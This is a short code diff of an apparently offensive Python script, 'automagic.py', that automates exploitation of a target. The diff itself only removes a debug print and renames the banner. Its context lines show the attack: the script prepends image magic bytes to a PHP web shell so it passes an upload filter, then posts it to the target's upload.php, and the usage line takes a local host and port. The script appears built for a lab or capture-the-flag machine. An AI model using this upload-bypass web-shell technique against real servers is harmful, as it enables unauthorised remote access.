@@ -60,7 +60,6 @@ def upload():
     webshell = open("./shell.php", "rb").read()
     phpshell = binmagicbyte + webshell
     uploadtarget = f"http://{targetip}/upload.php"
-    print(uploadtarget)
     s.post(
         uploadtarget,
         files={
@@ -88,7 +87,7 @@ def main():
     h = "*"
     head = h * 30
     print(head)
-    print('magicautopwn')
+    print('automagic')
     print('Usage: python3 ./automagic.py <Local Host> <Local Port>')
     print(head)
     return login()
